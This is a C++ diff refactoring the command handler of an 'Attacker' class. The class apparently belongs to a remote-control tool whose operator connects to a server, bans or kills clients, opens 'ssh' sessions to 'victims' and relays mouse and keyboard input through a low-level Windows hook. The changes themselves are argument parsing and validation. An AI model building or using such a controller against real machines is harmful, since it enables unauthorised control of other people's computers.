@@ -3,13 +3,6 @@
 #include <sstream>
 #include <SFML/Window.hpp>
 
-static constexpr uint32_t hash(const std::string s) noexcept {
-	uint32_t hash = 5381;
-	for (const char* c = s.c_str(); c < s.c_str() + s.size(); ++c)
-		hash = ((hash << 5) + hash) + (unsigned char)*c;
-	return hash;
-}
-
 Attacker* Attacker::attacker = nullptr;
 
 Attacker::Attacker(std::string inHId, ftxui::Tui& inTui)
@@ -162,7 +155,7 @@ void Attacker::receiveTcp()
 		responsesToProcess[reqId] = p;
 }
 
-void Attacker::connectServer(std::stringstream& ss, bool pw)
+void Attacker::connectServer(bool pw, std::string ipStr, short port)
 {
 	isInitialized = false;
 	isAdmin = false;
@@ -178,12 +171,6 @@ void Attacker::connectServer(std::stringstream& ss, bool pw)
 	tui.setDatabaseOutput("Server connection and admin privileges required");
 	tui.setInfoTitle(ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red));
 	tui.setSshTitle(ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red));
-
-	std::string ipStr;
-	short port = 0;
-	ss >> ipStr >> port;
-	if (port == 0)
-		port = 443;
 
 	//retrieve the ip and port from the interface string
 	//if no port is provided, default to 443
@@ -294,133 +281,249 @@ void Attacker::connectServer(std::stringstream& ss, bool pw)
 
 bool Attacker::handleCmd(const std::string& s)
 {
-	std::stringstream ss(s);
-	std::string cmd;
-	ss >> cmd;
+	std::vector<std::string> param;
+	std::string current;
+	bool inQuotes = false;
+	for (size_t i = 0; i < s.size(); ++i) {
+		char c = s[i];
 
-	//TODO: process command only if correct number of arguments is provided
+		if (c == '"') {
+			inQuotes = !inQuotes;
+			if (!current.empty()) {
+				param.push_back(current);
+				current.clear();
+			}
+			continue;
+		}
+
+		if (std::isspace(c) && !inQuotes) {
+			if (!current.empty()) {
+				param.push_back(current);
+				current.clear();
+			}
+		}
+		else {
+			current += c;
+		}
+	}
+
+	if (!current.empty())
+		param.push_back(current);
+
+	if (param.empty())
+		return true;
+
 	//TODO: add help command
+	//TODO: add server confirm to more cmds
 
-	switch (hash(cmd)) {
-	case hash("exit"): {
-		return false;
-		break;
+	std::string cmd = param[0];
+	param.erase(param.begin());
+
+	if (cmd == "help") {
+		if (param.size() != 0) {
+			tui.printServerShell("incorrect number of arguments entered\n");
+			return true;
+		}
+
+		tui.printServerShell("help command is not available yet\n");
 	}
-	case hash("clear"): {
-		tui.clearServerShell();
-		break;
+	else if (cmd == "exit") {
+		if (param.size() != 0)
+			tui.printServerShell("incorrect number of arguments entered\n");
+		else
+			return false;
 	}
-	case hash("connect"): {
-		connectServer(ss, false);
-		break;
+	else if (cmd == "clear") {
+		if (param.size() != 0)
+			tui.printServerShell("incorrect number of arguments entered\n");
+		else
+			tui.clearServerShell();
 	}
-	case hash("adminconnect"): {
-		connectServer(ss, true);
-		break;
+	else if (cmd == "togglemouse") {
+		if (param.size() != 0)
+			tui.printServerShell("incorrect number of arguments entered\n");
+		else if (isSshActive) {
+			isSendingMouse = !isSendingMouse;
+			tui.setIsSendingMouse(isSendingMouse);
+		}
+		else
+			tui.printServerShell("ssh must be active\n");
 	}
-	case hash("name"): {
+	else if (cmd == "togglekeyboard") {
+		if (param.size() != 0)
+			tui.printServerShell("incorrect number of arguments entered\n");
+		else if (isSshActive) {
+			isSendingKeyboard = !isSendingKeyboard;
+			tui.setIsSendingKeyboard(isSendingKeyboard);
+		}
+		else
+			tui.printServerShell("ssh must be active\n");
+	}
+	
+	//with server confirm
+	else if ((cmd == "connect") || (cmd == "adminconnect")) {
+		if (param.size() == 1)
+			connectServer(cmd == "adminconnect", param[0], 443);
+		else if (param.size() == 2) {
+			short port = 0;
+			try {
+				port = std::stoul(param[1]);
+			}
+			catch (std::exception& e) {
+				tui.printServerShell("invalid argument(s): " + std::string(e.what()) + "\n");
+				return true;
+			}
+
+			connectServer(cmd == "adminconnect", param[0], port);
+		}
+		else
+			tui.printServerShell("incorrect number of arguments entered\n");
+	}
+	else if (cmd == "name") {
+		if (param.size() != 2) {
+			tui.printServerShell("incorrect number of arguments entered\n");
+			return true;
+		}
 		if (!isInitialized) {
 			tui.printServerShell("client is not initialized\n");
-			break;
+			return true;
 		}
-		else if (!isAdmin) {
+		if (!isAdmin) {
 			tui.printServerShell("admin privileges are needed\n");
-			break;
+			return true;
 		}
 
-		std::string oHId, name;
-		ss >> oHId >> name;
-		if (oHId.empty() || name.empty()) {
-			tui.printServerShell("invalid arguments\n");
-			break;
+		//param[0] = hId, param[1] = name
+		sf::Packet req;
+		req << uint16_t(0) << uint8_t(Cmd::CHANGE_NAME) << param[0] << param[1];
+		if (server.send(req) != sf::Socket::Status::Done)
+			tui.printServerShell("failed to send request to server\n");
+	}
+	else if (cmd == "ban") {
+		if (param.size() != 1) {
+			tui.printServerShell("incorrect number of arguments entered\n");
+			return true;
+		}
+		if (!isInitialized) {
+			tui.printServerShell("client is not initialized\n");
+			return true;
+		}
+		if (!isAdmin) {
+			tui.printServerShell("admin privileges are needed\n");
+			return true;
+		}
+
+		//param[0] = hId
+		sf::Packet req;
+		req << uint16_t(0) << uint8_t(Cmd::BAN_HID) << param[0];
+		if (server.send(req) != sf::Socket::Status::Done)
+			tui.printServerShell("failed to send request to server\n");
+	}
+	else if (cmd == "unban") {
+		if (param.size() != 1) {
+			tui.printServerShell("incorrect number of arguments entered\n");
+			return true;
+		}
+		if (!isInitialized) {
+			tui.printServerShell("client is not initialized\n");
+			return true;
+		}
+		if (!isAdmin) {
+			tui.printServerShell("admin privileges are needed\n");
+			return true;
+		}
+
+		//param[0] = hId
+		sf::Packet req;
+		req << uint16_t(0) << uint8_t(Cmd::UNBAN_HID) << param[0];
+		if (server.send(req) != sf::Socket::Status::Done)
+			tui.printServerShell("failed to send request to server\n");
+	}
+	//with server confirm
+	else if (cmd == "save") {
+		if (param.size() != 0) {
+			tui.printServerShell("incorrect number of arguments entered\n");
+			return true;
+		}
+		if (!isInitialized) {
+			tui.printServerShell("client is not initialized\n");
+			return true;
+		}
+		if (!isAdmin) {
+			tui.printServerShell("admin privileges are needed\n");
+			return true;
 		}
 
 		sf::Packet req;
-		req << uint16_t(0) << uint8_t(Cmd::CHANGE_NAME) << oHId << name;
+		uint16_t reqId = requestId++;
+		req << uint16_t(reqId) << uint8_t(Cmd::SAVE_DATASET);
 		if (server.send(req) != sf::Socket::Status::Done)
 			tui.printServerShell("failed to send request to server\n");
-		break;
+
+		tui.printServerShell("waiting for response: [");
+		for (int i = 0; i < 10; i++) {
+			if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
+				tui.printServerShell("*");
+				sf::sleep(sf::milliseconds(500));
+			}
+			else
+				tui.printServerShell(".");
+		}
+		tui.printServerShell("] - ");
+
+		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
+			tui.printServerShell("request timed out\n");
+			return true;
+		}
+		else
+			tui.printServerShell("saved database\n");
 	}
-	case hash("ban"): {
+	else if (cmd == "kill") {
+		if (param.size() != 1) {
+			tui.printServerShell("incorrect number of arguments entered\n");
+			return true;
+		}
 		if (!isInitialized) {
 			tui.printServerShell("client is not initialized\n");
-			break;
+			return true;
 		}
-		else if (!isAdmin) {
+		if (!isAdmin) {
 			tui.printServerShell("admin privileges are needed\n");
-			break;
-		}
-
-		std::string oHId;
-		ss >> oHId;
-		if (oHId.empty()) {
-			tui.printServerShell("invalid arguments\n");
-			break;
-		}
-
-		sf::Packet req;
-		req << uint16_t(0) << uint8_t(Cmd::BAN_HID) << oHId;
-		if (server.send(req) != sf::Socket::Status::Done)
-			tui.printServerShell("failed to send request to server\n");
-		break;
-	}
-	case hash("unban"): {
-		if (!isInitialized) {
-			tui.printServerShell("client is not initialized\n");
-			break;
-		}
-		else if (!isAdmin) {
-			tui.printServerShell("admin privileges are needed\n");
-			break;
-		}
-
-		std::string oHId;
-		ss >> oHId;
-		if (oHId.empty()) {
-			tui.printServerShell("invalid arguments\n");
-			break;
-		}
-
-		sf::Packet req;
-		req << uint16_t(0) << uint8_t(Cmd::UNBAN_HID) << oHId;
-		if (server.send(req) != sf::Socket::Status::Done)
-			tui.printServerShell("failed to send request to server\n");
-		break;
-	}
-	case hash("kill"): {
-		if (!isInitialized) {
-			tui.printServerShell("client is not initialized\n");
-			break;
-		}
-		else if (!isAdmin) {
-			tui.printServerShell("admin privileges are needed\n");
-			break;
+			return true;
 		}
 
 		uint16_t oId = uint16_t(0);
-		ss >> oId;
-		if (oId == uint16_t(0)) {
-			tui.printServerShell("invalid arguments\n");
-			break;
+		try {
+			oId = std::stoul(param[0]);
+		}
+		catch (std::exception& e) {
+			tui.printServerShell("invalid argument(s): " + std::string(e.what()) + "\n");
+			return true;
 		}
 
 		sf::Packet req;
 		req << uint16_t(0) << uint8_t(Cmd::KILL) << oId;
 		if (server.send(req) != sf::Socket::Status::Done)
 			tui.printServerShell("failed to send request to server\n");
-		break;
 	}
-	case hash("ssh"): {
+	//with server confirm
+	else if (cmd == "ssh") {
+		if (param.size() != 1) {
+			tui.printServerShell("incorrect number of arguments entered\n");
+			return true;
+		}
 		if (!isInitialized) {
 			tui.printServerShell("client is not initialized\n");
-			break;
+			return true;
 		}
 
 		uint16_t oId = uint16_t(0);
-		ss >> oId;
-		if (oId == uint16_t(0)) {
-			tui.printServerShell("invalid arguments\n");
-			break;
+		try {
+			oId = std::stoul(param[0]);
+		}
+		catch (std::exception& e) {
+			tui.printServerShell("invalid argument(s): " + std::string(e.what()) + "\n");
+			return true;
 		}
 
 		sf::Packet req;
@@ -442,7 +545,7 @@ bool Attacker::handleCmd(const std::string& s)
 
 		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
 			tui.printServerShell("timed out\n");
-			break;
+			return true;
 		}
 
 		sf::Packet res = responsesToProcess[reqId];
@@ -467,71 +570,9 @@ bool Attacker::handleCmd(const std::string& s)
 			tui.printServerShell("victim occupied\n");
 		else
 			tui.printServerShell("unknown error\n");
-
-		break;
 	}
-	case hash("save"): {
-		if (!isInitialized) {
-			tui.printServerShell("client is not initialized\n");
-			break;
-		}
-		else if (!isAdmin) {
-			tui.printServerShell("admin privileges are needed\n");
-			break;
-		}
-
-		sf::Packet req;
-		uint16_t reqId = requestId++;
-		req << uint16_t(reqId) << uint8_t(Cmd::SAVE_DATASET);
-		if (server.send(req) != sf::Socket::Status::Done)
-			tui.printServerShell("failed to send request to server\n");
-
-		tui.printServerShell("waiting for response: [");
-		for (int i = 0; i < 10; i++) {
-			if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
-				tui.printServerShell("*");
-				sf::sleep(sf::milliseconds(500));
-			}
-			else
-				tui.printServerShell(".");
-		}
-		tui.printServerShell("] - ");
-
-		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
-			tui.printServerShell("request timed out\n");
-			break;
-		}
-		else
-			tui.printServerShell("saved database\n");
-
-		break;
-	}
-	case hash("togglemouse"): {
-		if (isSshActive) {
-			isSendingMouse = !isSendingMouse;
-			tui.setIsSendingMouse(isSendingMouse);
-		}
-		else
-			tui.printServerShell("ssh must be active\n");
-
-		break;
-	}
-	case hash("togglekeyboard"): {
-		if (isSshActive) {
-			isSendingKeyboard = !isSendingKeyboard;
-			tui.setIsSendingKeyboard(isSendingKeyboard);
-		}
-		else
-			tui.printServerShell("ssh must be active\n");
-
-		break;
-	}
-	case hash(""): break;
-	default: {
-		tui.printServerShell("enter a valid command\n");
-		break;
-	}
-	}
+	else
+		tui.printServerShell("command entered is not valid\n");
 
 	return true;
 }
@@ -662,8 +703,7 @@ LRESULT CALLBACK Attacker::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lP
 
 			break;
 		}
-		case WM_MOUSEWHEEL:
-		{
+		case WM_MOUSEWHEEL: {
 			int delta = GET_WHEEL_DELTA_WPARAM(par->mouseData);
 			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_SCROLL) << int16_t(delta);
 			_ = attacker->server.send(p);
